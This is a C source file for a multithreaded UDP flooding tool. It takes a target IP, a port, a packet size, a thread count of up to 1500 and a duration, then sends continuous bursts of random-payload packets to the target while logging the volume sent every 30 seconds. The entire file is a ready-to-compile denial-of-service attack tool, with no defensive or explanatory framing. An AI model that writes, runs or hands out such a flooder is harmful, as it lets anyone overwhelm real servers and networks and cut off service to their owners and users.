#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define MAX_PAYLOAD_SIZE 256
#define BURST_PACKETS 5000  // Number of packets sent in each burst
#define MAX_THREADS 1500     // Maximum number of threads allowed

// Struct to hold flooder parameters
typedef struct {
    char target_ip[16];
    int target_port;
    int packet_size;
    int duration;
    int thread_id;
} flooder_args;

// Global variables for packet and byte count (atomic)
static unsigned long packet_count = 0;
static unsigned long byte_count = 0;

// Flooder thread function
void *udp_flooder(void *args) {
    flooder_args *params = (flooder_args *)args;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &target_addr.sin_addr);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    // Pre-generate a random payload
    char payload[MAX_PAYLOAD_SIZE];
    for (int i = 0; i < params->packet_size; i++) {
        payload[i] = rand() % 256;
    }

    struct timespec start_time, current_time;
    clock_gettime(CLOCK_MONOTONIC, &start_time);

    while (1) {
        // Get the current time
        clock_gettime(CLOCK_MONOTONIC, &current_time);

        // Check if the duration has elapsed
        double elapsed_time = (current_time.tv_sec - start_time.tv_sec) +
                              (current_time.tv_nsec - start_time.tv_nsec) / 1e9;
        if (elapsed_time >= params->duration) {
            break;
        }

        // Send packets in bursts
        for (int i = 0; i < BURST_PACKETS; i++) {
            sendto(sock, payload, params->packet_size, 0,
                   (struct sockaddr *)&target_addr, sizeof(target_addr));
            __sync_fetch_and_add(&packet_count, 1);  // Atomic increment for packet count
            __sync_fetch_and_add(&byte_count, params->packet_size); // Atomic increment for byte count
        }
    }

    close(sock);
    return NULL;
}

// Data update thread (every 30 seconds) with data in MBs
void *update_data_usage(void *args) {
    unsigned long last_packet_count = 0;
    unsigned long last_byte_count = 0;
    
    while (1) {
        sleep(30);  // Update every 30 seconds
        
        // Calculate data used in the last 30 seconds
        unsigned long packet_diff = packet_count - last_packet_count;
        unsigned long byte_diff = byte_count - last_byte_count;
        
        // Convert bytes to MBs
        double byte_diff_mb = byte_diff / (1024.0 * 1024.0);  // Convert to MB
        double total_byte_count_mb = byte_count / (1024.0 * 1024.0);  // Convert to MB
        
        printf("\n--- Data Usage Update ---\n");
        printf("Packets sent in last 30 seconds: %lu\n", packet_diff);
        printf("Data sent in last 30 seconds: %.2f MB\n", byte_diff_mb);
        printf("Total Data sent: %.2f MB\n", total_byte_count_mb);
        printf("--------------------------\n");

        // Update last values
        last_packet_count = packet_count;
        last_byte_count = byte_count;
    }
}

// Main function
int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage: %s <IP> <PORT> <PACKET_SIZE> <THREADS> <DURATION>\n", argv[0]);
        return -1;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int packet_size = atoi(argv[3]);
    int threads = atoi(argv[4]);
    int duration = atoi(argv[5]);

    if (packet_size > MAX_PAYLOAD_SIZE) {
        printf("Error: Packet size must be <= %d bytes\n", MAX_PAYLOAD_SIZE);
        return -1;
    }

    if (threads > MAX_THREADS) {
        printf("Error: Thread count must be <= %d\n", MAX_THREADS);
        return -1;
    }

    pthread_t thread_pool[threads];
    pthread_t data_update_thread;
    flooder_args args[threads];

    // Start the data update thread to log data usage every 30 seconds
    pthread_create(&data_update_thread, NULL, update_data_usage, NULL);

    // Launch flooder threads
    for (int i = 0; i < threads; i++) {
        args[i].target_port = target_port;
        args[i].packet_size = packet_size;
        args[i].duration = duration;
        args[i].thread_id = i;
        strncpy(args[i].target_ip, target_ip, sizeof(args[i].target_ip) - 1);

        pthread_create(&thread_pool[i], NULL, udp_flooder, &args[i]);
    }

    // Wait for all flooder threads to complete
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }

    // Stop the data update thread
    pthread_cancel(data_update_thread);
    pthread_join(data_update_thread, NULL);

    printf("Flooding complete. Duration: %d seconds\n", duration);
    return 0;
}